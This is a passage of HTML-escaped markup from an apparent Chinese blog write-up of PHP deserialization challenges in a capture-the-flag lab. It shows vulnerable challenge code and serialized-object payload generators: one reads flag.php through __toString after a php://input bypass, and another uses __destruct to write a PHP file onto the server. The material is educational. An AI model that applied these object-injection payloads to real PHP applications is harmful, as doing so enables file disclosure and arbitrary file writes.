+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$KEY &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;TTEESSTT!!&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;print_r&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;serialize&lt;/span&gt;($KEY));
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-19-39-10.png&#34;
+	width=&#34;1021&#34;
+	height=&#34;257&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-19-39-10_hu5673715229ce2f709b18dad644d065ac_20207_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-19-39-10_hu5673715229ce2f709b18dad644d065ac_20207_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;397&#34;
+		data-flex-basis=&#34;953px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;传入该字符串即可&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-19-40-11.png&#34;
+	width=&#34;667&#34;
+	height=&#34;230&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-19-40-11_hu463b6081fe97561aa6b2a3f18dafd7a8_20017_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-20-19-40-11_hu463b6081fe97561aa6b2a3f18dafd7a8_20017_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;290&#34;
+		data-flex-basis=&#34;696px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;某靶场的一道反序列化相关的题目&lt;/p&gt;
+&lt;p&gt;index.php&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$txt &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;txt&amp;#34;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($txt) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;($txt, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;===&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;welcome to the ctf&amp;#34;&lt;/span&gt;)){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;hello friends!&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;preg_match&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/flag/&amp;#34;&lt;/span&gt;, $file)){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;不能现在就给你flag哦&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;include&lt;/span&gt;($file);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        $password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;($password);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $password;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;} &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;you are not the member of us!&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;show_source&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;!-- hint.php --&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分析代码可见需要&lt;code&gt;$txt&lt;/code&gt;变量赋值并且值需要等于&lt;code&gt;welcome to the ctf&lt;/code&gt;,因为函数&lt;code&gt;file_get_contents&lt;/code&gt;支持&lt;code&gt;php://input&lt;/code&gt;协议，所以可以被绕过。&lt;/p&gt;
+&lt;p&gt;然后是&lt;code&gt;$file&lt;/code&gt;变量不能够包含&lt;code&gt;flag&lt;/code&gt;字符串。&lt;/p&gt;
+&lt;p&gt;最后是可包含一个文件，一个反序列化操作，这里的&lt;code&gt;echo&lt;/code&gt;熟悉的朋友能看出来这是&lt;code&gt;toString&lt;/code&gt;魔法函数的可能性很大。&lt;/p&gt;
+&lt;p&gt;hint.php&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Flag&lt;/span&gt;{&lt;span style=&#34;color:#75715e&#34;&gt;//flag.php
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $file;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __toString(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;)){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; success!&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;good&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;show_source&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;因为包含了&lt;code&gt;hint.php&lt;/code&gt;，所以可以创建以下测试文件输出序列化字符串，再进行反序列化的时候，&lt;code&gt;$file&lt;/code&gt;变量会变成&lt;code&gt;flag.php&lt;/code&gt;，这样就能直接输出flag的值了。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Flag&lt;/span&gt;{&lt;span style=&#34;color:#75715e&#34;&gt;//flag.php
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag.php&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __toString(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;isset&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;)){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;($this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;good&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Flag&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;serialize&lt;/span&gt;($a);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-16-35-48.png&#34;
+	width=&#34;1031&#34;
+	height=&#34;436&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-16-35-48_hu0eaef9be15de1dc4443280970161703b_40962_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-16-35-48_hu0eaef9be15de1dc4443280970161703b_40962_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;236&#34;
+		data-flex-basis=&#34;567px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-16-36-17.png&#34;
+	width=&#34;1272&#34;
+	height=&#34;681&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-16-36-17_hu95f03caaed6e0a11fd83c4533aad02d0_150206_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-16-36-17_hu95f03caaed6e0a11fd83c4533aad02d0_150206_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;186&#34;
+		data-flex-basis=&#34;448px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;再看一题&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2.txt&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __destruct(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;file_put_contents&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;dirname&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;, $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$file_name &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $_GET[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;filename&amp;#39;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;You have readfile &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $file_name;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;unserialize&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;file_get_contents&lt;/span&gt;($file_name));
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;分析代码，&lt;code&gt;$file_name&lt;/code&gt;参数可控，存在反序列化情况，只要新建一个对象那么就会在文件里面写指定内容，但是内容和文件名都是可控的。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $file &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;get.php&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; $data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;?php show_source(&amp;#39;flag.php&amp;#39;);?&amp;gt;&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; __destruct(){
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;file_put_contents&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;dirname&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__FILE__&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;, $this&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;serialize&lt;/span&gt;($a);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-17-10-05.png&#34;
+	width=&#34;1326&#34;
+	height=&#34;458&#34;
+	srcset=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-17-10-05_huf8cc321540b76a6771eb3042ebeb2e4b_48752_480x0_resize_box_3.png 480w, https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-17-10-05_huf8cc321540b76a6771eb3042ebeb2e4b_48752_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;289&#34;
+		data-flex-basis=&#34;694px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://fragrant1001.github.io/post/2023/phpunserialize/2020-10-21-17-11-24.png&#34;
+	width=&#34;1173&#34;
+	height=&#34;649&#34;
